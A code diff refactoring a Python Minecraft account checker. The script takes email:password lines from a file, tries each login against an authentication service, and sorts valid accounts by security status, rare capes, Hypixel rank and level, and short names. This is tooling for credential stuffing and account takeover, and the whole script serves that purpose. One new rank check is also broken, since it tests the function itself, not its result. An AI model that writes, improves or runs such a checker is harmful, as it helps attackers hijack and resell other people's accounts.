@@ -5,7 +5,22 @@ from file_creator import *
 
 create_files()
 account_file_lines = open(BASIC_PATH + '\\accounts.txt').read().split('\n')
-counter = [0,0,0,0,0,0,0,0,0,0,0]
+class Counter:
+    valid = 0
+    invalid = 0
+    insecure = 0
+    minecon = 0
+    fivezig = 0
+    optifine = 0
+    labymod = 0
+    liquidbounce = 0
+    hypixelrank = 0
+    hypixellevel = 0
+    shortname = 0
+
+
+
+hypixel_min_level = 1
 
 for x in range(len(account_file_lines)):
     email_username = account_file_lines[x].split(':', 1)[0]
@@ -15,67 +30,68 @@ for x in range(len(account_file_lines)):
     if not str(answer).__contains__('Invalid credentials'):
         print('Valid Account')
         UUID = answer["availableProfiles"][0]["id"]
-        print('UUID: ' + answer["availableProfiles"][0]["id"])
         USERNAME = answer["availableProfiles"][0]["name"]
-        print('Username: ' + answer["availableProfiles"][0]["name"])
         hpRank = hypixel_rank_check(USERNAME)
         hpLevel = hypixel_level_check(USERNAME)
 
         open(FOLDER_PATH + '\\working.txt', 'a').write(account_file_lines[x] + "\n")
-        counter[0] += 1
+        Counter.valid += 1
 
         if bool(answer["user"]["secured"]) is False:
-            open(FOLDER_PATH + '\\unsecure.txt', 'a').write(account_file_lines[x] + "\n")
-            counter[2] += 1
-            print('Unsecure account')
+            open(FOLDER_PATH + '\\insecure.txt', 'a').write(account_file_lines[x] + "\n")
+            Counter.insecure += 1
+            print('Insecure account')
         if minecon_cape_request(UUID) is True:
             open(FOLDER_PATH + '\\minecon.txt', 'a').write(account_file_lines[x] + "\n")
-            counter[3] += 1
+            Counter.minecon += 1
             print('Minecon-Cape')
         if five_zig_cape_request(UUID) is True:
-            open(FOLDER_PATH + '\\optifine.txt', 'a').write(account_file_lines[x] + "\n")
-            counter[4] += 1
+            open(FOLDER_PATH + '\\5zig.txt', 'a').write(account_file_lines[x] + "\n")
+            Counter.fivezig += 1
             print('5zig-Cape')
         if optifine_cape_request(USERNAME) is True:
             open(FOLDER_PATH + '\\optifine.txt', 'a').write(account_file_lines[x] + "\n")
-            counter[5] += 1
+            Counter.optifine += 1
             print('Optifine-Cape')
         if laby_mod_cape_request(UUID) is True:
             open(FOLDER_PATH + '\\labymod.txt', 'a').write(account_file_lines[x] + "\n")
-            counter[6] += 1
+            Counter.labymod += 1
             print('Labymod-Cape')
         if liquidbounce_cape_request(UUID) is True:
             open(FOLDER_PATH + '\\liquidbounce.txt', 'a').write(account_file_lines[x] + "\n")
-            counter[7] += 1
+            Counter.liquidbounce += 1
             print('LiquidBounce-Cape')
-        if hpRank is not False:
-            open(FOLDER_PATH + '\\hypixel.txt', 'a').write(account_file_lines[x] + "\n")
-            counter[8] += 1
-            print('Hypixel Rank: {0}'.format(hpRank))
-        if hpLevel is not False:
-            open(FOLDER_PATH + '\\hypixel.txt', 'a').write(account_file_lines[x] + "\n")
-            counter[9] += 1
-            print('Hypixel Level: {0}'.format(hpLevel))
+        if hypixel_rank_check is False:
+            open(FOLDER_PATH + '\\hypixelRank.txt', 'a').write(account_file_lines[x] + '| Rank: ' + hpRank + "\n")
+            Counter.hypixelrank += 1
+            print('Hypixel Rank: ' + hpRank)
+        if float(hpLevel) >= hypixel_min_level:
+            open(FOLDER_PATH + '\\hypixelLevel.txt', 'a').write(account_file_lines[x] + '| Level: ' + hpLevel + "\n")
+            Counter.hypixellevel += 1
+            print('Hypixel Level: ' + hpLevel)
         
         if under_four_character_long(USERNAME) is True:
             open(FOLDER_PATH + '\\special_name.txt', 'a').write(account_file_lines[x] + "\n")
-            counter[10] += 1
+            Counter.shortname += 1
             print('Short name')
 
         print('Progress: ' + str(x + 1)+'/' + str(len(account_file_lines)))
     else:
         print('Invalid Account')
-        counter[1] += 1
+        Counter.invalid += 1
         print('Progress: ' + str(x + 1) + '/' + str(len(account_file_lines)))
+
+
+Counter_list = [str(Counter.valid) + ' Valid accounts',str(Counter.invalid) + ' Invalid accounts',
+             str(Counter.insecure) + ' Insecure accounts',str(Counter.minecon) + ' Minecon-capes',
+             str(Counter.fivezig) + ' 5zig-capes',str(Counter.optifine) + ' Optifine-capes',
+             str(Counter.labymod) + ' Labymod-capes',str(Counter.liquidbounce) + ' LiquidBounce-capes',
+             str(Counter.hypixelrank) + ' Hypixel-Rank accounts',str(Counter.hypixellevel) + ' Hypixel-Level accounts',
+             str(Counter.shortname) + ' Short-name accounts']
 
 print('\n\nResult:\n')
 
-counter_names = [str(counter[0]) + ' Valid accounts', str(counter[1]) + ' Invalid accounts',
-                 str(counter[2]) + ' Insecure accounts', str(counter[3]) + ' Minecon accounts',
-                 str(counter[4]) + ' 5zig accounts', str(counter[5]) + ' Optifine accounts',
-                 str(counter[6]) + ' Labymod accounts', str(counter[7]) + ' LiquidBounce accounts',
-                 str(counter[8]) + ' Ranked Hypixel accounts', str(counter[10]) + ' Short-name accounts']
-for x in range(len(counter_names) - 0):
-    print(counter_names[x])
+for x in range(len(Counter_list) - 0):
+    print(Counter_list[x])
 
 input()
